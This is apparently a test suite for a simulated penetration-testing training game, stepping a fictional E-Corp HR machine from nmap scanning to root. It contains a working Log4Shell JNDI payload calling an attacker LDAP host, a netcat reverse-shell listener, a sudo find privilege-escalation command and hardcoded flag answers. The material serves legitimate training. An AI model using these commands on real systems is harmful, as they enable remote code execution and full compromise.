import { describe, it, expect, beforeEach } from 'vitest';
import { SimulationEngine } from '../simulation/simulationEngine';
import { CommandInterpreter, CommandContext } from '../services/commandInterpreter';
import { VirtualFileSystem } from '../services/virtualFs';
import { useGameStore, INITIAL_MACHINES } from '../store/gameStore';

describe('Phase 4: E-Corp HR Training Machine Journey', () => {
  let engine: SimulationEngine;
  let fs: VirtualFileSystem;

  const getContext = (user = 'kali', cwd = '/home/kali', inReverseShell = false): CommandContext => ({
    user,
    hostname: inReverseShell ? 'ecorp-hr' : 'pwnbox',
    cwd,
    fs,
    activeTarget: INITIAL_MACHINES[0], // E-Corp HR Portal (10.10.11.45)
    history: [],
    inReverseShell,
    reverseShellUser: inReverseShell ? user : undefined,
    reverseShellHost: inReverseShell ? 'ecorp-hr' : undefined,
  });

  beforeEach(() => {
    engine = SimulationEngine.getInstance();
    engine.resetRange();
    fs = new VirtualFileSystem();
    useGameStore.getState().resetGame();
  });

  it('verifies initial machine specifications and pristine state', () => {
    const machine = engine.getMachine('ecorp-hr');
    expect(machine).toBeDefined();
    expect(machine?.name).toBe('E-Corp HR Portal');
    expect(machine?.hostname).toBe('ecorp-hr');
    expect(machine?.ip).toBe('10.10.11.45');
    expect(machine?.os).toBe('Linux');
    expect(machine?.difficulty).toBe('Easy');
    expect(machine?.points.user).toBe(20);
    expect(machine?.points.root).toBe(30);

    expect(engine.getMachineCompromiseLevel('ecorp-hr')).toBe('NONE');
    expect(engine.getDiscoveredPorts('ecorp-hr')).toHaveLength(0);

    const objectives = engine.getObjectives('ecorp-hr');
    expect(objectives).toHaveLength(7);
    expect(objectives.every((o) => !o.completed)).toBe(true);
  });

  it('completes Step 1: Network Reconnaissance via nmap', () => {
    const ctx = getContext();
    const scanRes = CommandInterpreter.execute('nmap -sV -sC 10.10.11.45', ctx);

    expect(scanRes.exitCode).toBe(0);
    expect(scanRes.output).toContain('Nmap scan report for E-Corp HR Portal (10.10.11.45)');
    expect(scanRes.output).toContain('22/tcp');
    expect(scanRes.output).toContain('80/tcp');
    expect(scanRes.output).toContain('8080/tcp');
    expect(scanRes.output).toContain('OpenSSH 8.9p1 Ubuntu');
    expect(scanRes.output).toContain('Apache/2.4.49 (Log4j / Spring)');

    // Discovered ports recorded in engine
    expect(engine.getDiscoveredPorts('ecorp-hr')).toEqual([22, 80, 8080]);

    // Objective 1 completed
    const obj1 = engine.getObjectives('ecorp-hr').find((o) => o.id === 'ecorp-obj-1');
    expect(obj1?.completed).toBe(true);

    // Objective 2 is now unlocked
    expect(engine.isObjectiveUnlocked('ecorp-obj-2')).toBe(true);
  });

  it('completes Step 2: Web Directory Enumeration via gobuster', () => {
    // Complete prereq
    engine.completeObjective('ecorp-hr', 'ecorp-obj-1');

    const ctx = getContext();
    const gobusterRes = CommandInterpreter.execute('gobuster dir -u http://10.10.11.45 -w common.txt', ctx);

    expect(gobusterRes.exitCode).toBe(0);
    expect(gobusterRes.output).toContain('/portal');
    expect(gobusterRes.output).toContain('/login');
    expect(gobusterRes.output).toContain('/api/audit');
    expect(gobusterRes.output).toContain('/admin');

    const obj2 = engine.getObjectives('ecorp-hr').find((o) => o.id === 'ecorp-obj-2');
    expect(obj2?.completed).toBe(true);

    // Objective 3 unlocked
    expect(engine.isObjectiveUnlocked('ecorp-obj-3')).toBe(true);
  });

  it('completes Step 3: Vulnerability Investigation via curl & Log4Shell trigger', () => {
    engine.completeObjective('ecorp-hr', 'ecorp-obj-1');
    engine.completeObjective('ecorp-hr', 'ecorp-obj-2');

    const ctx = getContext();
    const curlRes = CommandInterpreter.execute(
      'curl -X POST -H "Content-Type: application/json" -d \'{"log":"${jndi:ldap://10.10.14.22:1389/Exploit}"}\' http://10.10.11.45/api/audit',
      ctx
    );

    expect(curlRes.exitCode).toBe(0);
    expect(curlRes.output).toContain('exploit_triggered');
    expect(curlRes.soundTrigger).toBe('connect');

    const obj3 = engine.getObjectives('ecorp-hr').find((o) => o.id === 'ecorp-obj-3');
    expect(obj3?.completed).toBe(true);
    expect(engine.isObjectiveUnlocked('ecorp-obj-4')).toBe(true);
  });

  it('completes Step 4: Simulated Initial Access via Netcat Reverse Shell Catch', () => {
    engine.completeObjective('ecorp-hr', 'ecorp-obj-1');
    engine.completeObjective('ecorp-hr', 'ecorp-obj-2');
    engine.completeObjective('ecorp-hr', 'ecorp-obj-3');

    const ctx = getContext();
    const ncRes = CommandInterpreter.execute('nc -lvnp 4444', ctx);

    expect(ncRes.exitCode).toBe(0);
    expect(ncRes.enterShell).toBeDefined();
    expect(ncRes.enterShell?.user).toBe('www-data');
    expect(ncRes.enterShell?.host).toBe('ecorp-hr');
    expect(ncRes.targetCompromised).toBe('USER');

    expect(engine.getMachineCompromiseLevel('ecorp-hr')).toBe('USER');
    const obj4 = engine.getObjectives('ecorp-hr').find((o) => o.id === 'ecorp-obj-4');
    expect(obj4?.completed).toBe(true);
    expect(engine.isObjectiveUnlocked('ecorp-obj-5')).toBe(true);
  });

  it('completes Step 5: User Flag Capture from /home/alex/user.txt', () => {
    engine.completeObjective('ecorp-hr', 'ecorp-obj-1');
    engine.completeObjective('ecorp-hr', 'ecorp-obj-2');
    engine.completeObjective('ecorp-hr', 'ecorp-obj-3');
    engine.completeObjective('ecorp-hr', 'ecorp-obj-4');
    engine.setMachineCompromiseLevel('ecorp-hr', 'USER');

    const userShellCtx = getContext('www-data', '/home/alex', true);
    const catUserRes = CommandInterpreter.execute('cat /home/alex/user.txt', userShellCtx);

    expect(catUserRes.exitCode).toBe(0);
    expect(catUserRes.output).toContain('ROOTRANGE{u53r_l0g4j_f00th0ld_pwn3d}');

    const submitRes = useGameStore.getState().submitFlag('ROOTRANGE{u53r_l0g4j_f00th0ld_pwn3d}');
    expect(submitRes.success).toBe(true);
    expect(submitRes.pointsAwarded).toBe(20);
    expect(submitRes.flagType).toBe('user');
    expect(useGameStore.getState().score).toBe(20);

    engine.completeObjective('ecorp-hr', 'ecorp-obj-5');
    expect(engine.isObjectiveUnlocked('ecorp-obj-6')).toBe(true);
  });

  it('completes Step 6: Local Enumeration via sudo -l and linpeas.sh', () => {
    // Satisfy full prerequisite chain
    engine.completeObjective('ecorp-hr', 'ecorp-obj-1');
    engine.completeObjective('ecorp-hr', 'ecorp-obj-2');
    engine.completeObjective('ecorp-hr', 'ecorp-obj-3');
    engine.completeObjective('ecorp-hr', 'ecorp-obj-4');
    engine.completeObjective('ecorp-hr', 'ecorp-obj-5');

    const userShellCtx = getContext('alex', '/home/alex', true);

    // 1. Sudo check
    const sudoCheck = CommandInterpreter.execute('sudo -l', userShellCtx);
    expect(sudoCheck.exitCode).toBe(0);
    expect(sudoCheck.output).toContain('NOPASSWD: /usr/bin/find');

    // 2. LinPEAS automated scan
    const linpeasRes = CommandInterpreter.execute('./linpeas.sh', userShellCtx);
    expect(linpeasRes.exitCode).toBe(0);
    expect(linpeasRes.output).toContain('Linux Privilege Escalation Awesome Script');
    expect(linpeasRes.output).toContain('NOPASSWD: /usr/bin/find');
    expect(linpeasRes.output).toContain('gtfobins.github.io');

    const obj6 = engine.getObjectives('ecorp-hr').find((o) => o.id === 'ecorp-obj-6');
    expect(obj6?.completed).toBe(true);
    expect(engine.isObjectiveUnlocked('ecorp-obj-7')).toBe(true);
  });

  it('completes Step 7: Privilege Escalation via find GTFOBins & Root Flag Capture', () => {
    // Satisfy full prerequisite chain
    engine.completeObjective('ecorp-hr', 'ecorp-obj-1');
    engine.completeObjective('ecorp-hr', 'ecorp-obj-2');
    engine.completeObjective('ecorp-hr', 'ecorp-obj-3');
    engine.completeObjective('ecorp-hr', 'ecorp-obj-4');
    engine.completeObjective('ecorp-hr', 'ecorp-obj-5');
    engine.completeObjective('ecorp-hr', 'ecorp-obj-6');

    const userShellCtx = getContext('alex', '/home/alex', true);

    // Exploit find binary to spawn root shell
    const privescRes = CommandInterpreter.execute('sudo /usr/bin/find . -exec /bin/sh \\; -quit', userShellCtx);
    expect(privescRes.exitCode).toBe(0);
    expect(privescRes.enterShell?.user).toBe('root');
    expect(privescRes.targetCompromised).toBe('ROOT');
    expect(engine.getMachineCompromiseLevel('ecorp-hr')).toBe('ROOT');

    // Read root flag as root
    const rootShellCtx = getContext('root', '/root', true);
    const catRootRes = CommandInterpreter.execute('cat /root/root.txt', rootShellCtx);
    expect(catRootRes.exitCode).toBe(0);
    expect(catRootRes.output).toContain('ROOTRANGE{r00t_pr1v3sc_m4st3r_c0mpr0m1s3}');

    // Submit root flag
    const submitRootRes = useGameStore.getState().submitFlag('ROOTRANGE{r00t_pr1v3sc_m4st3r_c0mpr0m1s3}');
    expect(submitRootRes.success).toBe(true);
    expect(submitRootRes.pointsAwarded).toBe(30);
    expect(submitRootRes.flagType).toBe('root');

    expect(useGameStore.getState().score).toBe(30); // 30 root pts
    expect(useGameStore.getState().machines.find((m) => m.id === 'ecorp-hr')?.compromiseLevel).toBe('ROOT');
  });

  it('enforces permission security: unprivileged user cannot read root flag directly', () => {
    const kaliCtx = getContext('kali', '/home/kali', false);
    const prematureCat = CommandInterpreter.execute('cat /root/root.txt', kaliCtx);
    expect(prematureCat.exitCode).toBe(1);
    expect(prematureCat.output).toContain('Permission denied');
  });

  it('inspects fictional application source code and configuration files', () => {
    const alexCtx = getContext('alex', '/home/alex', true);
    const wwwCtx = getContext('www-data', '/var/www', true);

    const javaSource = CommandInterpreter.execute('cat /opt/ecorp/Log4jAuditLogger.java', alexCtx);
    expect(javaSource.exitCode).toBe(0);
    expect(javaSource.output).toContain('Log4jAuditLogger');
    expect(javaSource.output).toContain('CVE-2021-44228');

    const pom = CommandInterpreter.execute('cat /opt/ecorp/pom.xml', alexCtx);
    expect(pom.exitCode).toBe(0);
    expect(pom.output).toContain('<artifactId>log4j-core</artifactId>');
    expect(pom.output).toContain('<version>2.14.1</version>');

    // /var/www/html/config.php is mode 0640 owned by www-data
    const config = CommandInterpreter.execute('cat /var/www/html/config.php', wwwCtx);
    expect(config.exitCode).toBe(0);
    expect(config.output).toContain('$ldap_endpoint');
  });

  it('resets machine state back to pristine initial state on command or action', () => {
    // Alter machine state
    engine.discoverPort('ecorp-hr', 80);
    engine.discoverRoute('ecorp-hr', '/api/audit');
    engine.setMachineCompromiseLevel('ecorp-hr', 'ROOT');
    engine.completeObjective('ecorp-hr', 'ecorp-obj-1');

    expect(engine.getMachineCompromiseLevel('ecorp-hr')).toBe('ROOT');

    // Reset machine
    const ctx = getContext();
    const resetRes = CommandInterpreter.execute('reset', ctx);
    expect(resetRes.exitCode).toBe(0);
    expect(resetRes.output).toContain('has been reset to pristine initial state');

    expect(engine.getMachineCompromiseLevel('ecorp-hr')).toBe('NONE');
    expect(engine.getDiscoveredPorts('ecorp-hr')).toHaveLength(0);
    expect(engine.getObjectives('ecorp-hr').every((o) => !o.completed)).toBe(true);
  });
});
